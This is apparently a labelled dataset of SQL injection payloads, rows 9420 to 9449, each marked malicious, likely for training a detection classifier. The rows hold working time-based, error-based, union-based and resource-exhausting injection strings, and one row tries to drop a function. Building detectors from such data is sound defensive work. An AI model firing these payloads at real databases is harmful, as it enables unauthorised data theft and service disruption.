row_index,payload_norm,label,sqli_type_hint
9420,"1' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'niro' = 'niro",1,
9421,1%' ) ) rlike ( select ( case when ( 6094 = 7893 ) then 1 else 0x28 end ) ) and ( ( '%' = ',1,
9422,"1 ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
9423,1' ) where 5540 = 5540 waitfor delay '0:0:5'--,1,
9424,1' ) rlike ( select ( case when ( 7447 = 3981 ) then 1 else 0x28 end ) ),1,
9425,1'+ ( select lptb where 3861 = 3861 or sleep ( 5 ) ) +',1,
9426,if ( 6767 = 5022 ) select 6767 else drop function buii--,1,
9427,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( ""eakt"" like ""eakt",1,
9428,"1"" ) ) ) and 2006 = 2006",1,
9429,"-9370' ) where 7070 = 7070 or make_set ( 9354 = 9354,7185 ) --",1,
9430,"1 where 6169 = 6169 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",1,
9431,-4906' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'pkrq' = 'pkrq,1,
9432,"1'+ ( select vxax where 9036 = 9036 and elt ( 1210 = 1210,sleep ( 5 ) ) ) +'",1,
9433,1 ) as bpap where 7758 = 7758 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
9434,-1188 ) ) union all select 4711--,1,
9435,"-2601' ) union all select 2866,2866,2866,2866,2866,2866--",1,
9436,1 ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 1233 = 1233,1,
9437,"1 where 6965 = 6965 and elt ( 3933 = 1232,1232 ) --",1,
9438,"1%"" ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ""%"" = """,1,
9439,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( 'xmwj' = 'xmwj",1,
9440,"1'|| ( select 'nvrq' from dual where 4337 = 4337 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
9441,"-1606'|| ( select 'qbaa' where 3967 = 3967 union all select 3967,3967,3967,3967,3967--",1,
9442,"1' ) as jrwx where 6087 = 6087 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",1,
9443,"1' ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( 'wnzv' = 'wnzv",1,
9444,"1' ) or elt ( 6272 = 6272,sleep ( 5 ) )",1,
9445,"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",1,
9446,"-9629' ) ) ) union all select 3077,3077,3077,3077#",1,
9447,"-1876'|| ( select 'itfc' from dual where 9584 = 9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",1,
9448,-5369' ) or 3208 = 6669#,1,
9449,1 ) ) as prxq where 4600 = 4600,1,
